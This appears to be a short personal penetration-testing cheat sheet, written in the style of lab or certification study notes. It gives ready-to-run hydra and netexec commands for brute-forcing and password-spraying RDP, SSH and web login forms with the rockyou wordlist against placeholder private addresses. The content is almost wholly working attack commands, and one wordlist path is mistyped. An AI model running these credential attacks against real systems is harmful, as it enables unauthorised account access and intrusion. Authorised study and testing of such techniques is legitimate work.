# RDP
### hydra
password attack
```
hydra -l user -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.x.x
```

password splay
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password" rdp://192.168.x.x
```
### netexec
```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o /tmp/rockyou-utf8.txt
```

use default
```
netexec rdp 192.168.x.x -u user -p /tmp/rockyou-utf8.txt
```

thread 20
```
netexec rdp 192.168.x.x -u user -p /tmp/rockyou-utf8.txt -t 20
```

# SSH
### hydra
```
hydra -l user -P /usr/hare/wordlists/rockyou.txt -s 2222 ssh://192.168.x.x
```

# HTTP
### Hydra
1. use burpsuit and login request
![[../../Pasted image 20250702194420.png]]

and intercepted login request
![[../../Pasted image 20250702194521.png]]

hydra commad
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```